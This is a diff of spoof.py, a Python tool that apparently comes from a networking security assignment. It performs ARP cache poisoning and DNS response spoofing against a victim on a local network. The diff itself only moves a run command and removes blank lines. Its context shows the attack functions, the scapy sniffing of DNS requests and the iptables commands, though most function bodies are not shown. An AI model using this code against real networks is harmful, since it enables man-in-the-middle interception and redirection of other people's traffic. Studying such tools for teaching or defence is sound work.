@@ -1,5 +1,3 @@
-#python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8
-
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  SOURCE FILE:    spoof.py
 --
@@ -13,6 +11,8 @@
 --  REVISIONS: November 14, 2016
 --
 --  DESIGNERS: Kyle Gilles & Clemens Lo
+--
+--	TO RUN: python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8
 --
 --  NOTES:
 --  Our Attacking machine initiates ARP Poisoning on the victim machine. 
@@ -53,9 +53,6 @@ def getOurMAC(interface):
     return mac[0:17]
 
 
-
-
-
 #returns MAC address of supplied IP address
 def getMAC(IP):
 
@@ -87,8 +84,6 @@ def poison(localMAC, victimMAC, routerMAC):
             sys.exit(0)
 
 
-
-
 #construc and send a spoofed DNS response packet to the victim
 def respond(packet):
     global targetIP
@@ -100,16 +95,12 @@ def respond(packet):
     return
 
 
-
-
 #this parse creates a thread
 def parse(packet):
     #qr==0 is a dns request
 	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
 		respondThread = threading.Thread(target=respond, args=packet)
 		respondThread.start()
-
-
 
 
 #this parse creates a process
@@ -120,8 +111,6 @@ def parse(packet):
 #		esponseProcess.join()
 
 
-
-
 #initiate sniff filter for DNS requests
 def sniffDNS():
     global victimIP
@@ -130,13 +119,9 @@ def sniffDNS():
     sniff(filter=sniffFilter, prn=parse)
 
 
-
-
 #invoked on user exit. Flush iptables rules
 def reset():
     Popen(["iptables -F"], shell=True, stdout=PIPE)
-
-
 
 
 #invoked on start. Setup prerequesites.
@@ -150,8 +135,6 @@ def setup():
     #disable forwarding of DNS requests to router
     #uncomment line below to invoke iptables rule
     #Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)
-
-
 
 
 
@@ -172,7 +155,6 @@ def main():
 
     poisonThread.start()
     spoofThread.start()
-
 
 
     #CTRL C invokes reset method to handle iptables flush
